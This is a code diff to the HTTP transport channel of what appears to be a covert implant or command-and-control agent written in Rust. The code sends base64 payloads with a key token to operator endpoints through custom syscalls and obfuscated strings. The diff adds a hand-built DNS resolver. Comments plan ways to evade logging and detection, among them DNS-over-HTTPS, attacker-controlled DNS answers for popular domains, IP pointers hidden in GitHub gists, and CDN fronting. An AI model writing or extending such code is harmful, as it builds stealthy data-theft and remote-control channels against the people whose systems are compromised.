@@ -2,8 +2,12 @@ use base64::Engine;
 use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;
 
 use super::{Channel, ChannelInfo, Latency, SendContext};
+use core::net::SocketAddr;
+use core::net::Ipv4Addr;
+use crate::dns;
 use crate::strings;
 use crate::sys;
+use crate::errors::ChannelError;
 
 pub struct HTTPChannel {
     endpoints: Vec<String>,
@@ -17,7 +21,7 @@ impl HTTPChannel {
             endpoints,
             current: std::sync::atomic::AtomicUsize::new(0),
             info: ChannelInfo {
-                name: "https",
+                name: "http",
                 max_payload: 1 << 20,
                 bidirectional: true,
                 confirmed: true,
@@ -61,6 +65,7 @@ impl HTTPChannel {
             }
         }
     }
+
 }
 
 impl Channel for HTTPChannel {
@@ -77,32 +82,60 @@ impl Channel for HTTPChannel {
         // let body = format!("{}{}", key_id_hex, payload_b64);
         let body = format!("data={}&token={}", payload_b64, key_id_hex);
 
-        // will have to put a lot of thought into the dns portion here.
-        // lot of options, doh to a popular dns like 1.1.1.1
-        // piggyback on existing resolvers
-        // query a dns server we control for a popular domain but return our own ips
-        // encode the ip into a legitimate looking github gist or repo
-        // host behind a popular cdn or a pointer file behind a popular cdn
-        // lot of trade-offs and ease of logging at each step
-        // will think of other creative solutions for this soon
-        // Resolve hostname
-        let addr = sys::resolve(host, port)?;
-
-        // Create socket via raw syscall
+        // Create socket via syscall
         let fd = match sys::socket_tcp() {
             Ok(fd) => fd,
             Err(e) => {
-                self.advance_endpoint();
                 return Err(e.into());
             }
         };
 
-        // Connect via raw syscall
-        if let Err(e) = sys::connect_tcp(fd, &addr) {
-            let _ = sys::close(fd);
-            self.advance_endpoint();
-            return Err(e.into());
+        let mut last_err: Option<ChannelError> = None;
+        let mut connected = false;
+
+        // will have to put a lot of thought into the dns portion here.
+        // lot of options, doh to a popular dns like 1.1.1.1
+        // piggyback on existing resolvers
+        // query a dns server we control for a popular domain but return our own ips
+        // use the ip to encode data, likely easy to flag with non-routable ips/etc without a complex list of ranges to avoid
+        // encode the ip into a legitimate looking github gist or repo
+        // host behind a popular cdn or a pointer file behind a popular cdn
+        // lot of trade-offs and ease of logging at each step
+        // will think of other creative solutions for this soon
+        if let Ok(ip) = host.parse::<Ipv4Addr>() {
+            // Already an IP, skip DNS
+            let addr = SocketAddr::from((ip, port));
+            crate::dbg_log!("[http] connecting to endpoint {}:{}", ip, port);
+            match sys::connect_tcp(fd, &addr)
+                .map_err(|e| ChannelError::SendFailed(e.to_string())) {
+                    Ok(()) => { connected = true; }
+                    Err(e) => last_err = Some(e),
+            }
+        } else {
+            // Resolve hostname using our udp socket and raw crafted packet for now, try each ip until one connects
+            match dns::lookup_a(host) {
+                Ok(ips) => {
+                    for ip in ips.v4_records() {
+                        let addr = SocketAddr::from((ip.addr, port));
+                        crate::dbg_log!("[http] connecting to endpoint {}:{}", ip.addr, port);
+                        match sys::connect_tcp(fd, &addr)
+                            .map_err(|e| ChannelError::SendFailed(e.to_string())) {
+                                Ok(()) => { connected = true; break; }
+                                Err(e) => last_err = Some(e),
+                        }
+                    }
+                }
+                Err(e) => last_err = Some(ChannelError::SendFailed(format!("dns {host}: {e}"))),
+            }
         }
+
+        if !connected {
+            crate::dbg_log!("[http] failed to connect to any endpoints");
+            return Err(ChannelError::SendFailed(
+                last_err.map(|e| e.to_string()).unwrap_or_else(|| "no addresses".into())
+            ).into());
+        }
+        // todo: iterate through endpoints with advance_endpoint() if all ips fail
 
         // Set read timeout
         let _ = sys::set_read_timeout(fd, 30);
@@ -132,13 +165,13 @@ impl Channel for HTTPChannel {
         req.extend_from_slice(&strings::decode(strings::CRLF));
         req.extend_from_slice(body.as_bytes());
 
-        // Write via raw syscall
+        // Write via syscall
         if let Err(e) = sys::write_all(fd, &req) {
             let _ = sys::close(fd);
             return Err(e.into());
         }
 
-        // Read response via raw syscall
+        // Read response via syscall
         let mut response = Vec::new();
         let mut buf = [0u8; 4096];
         loop {
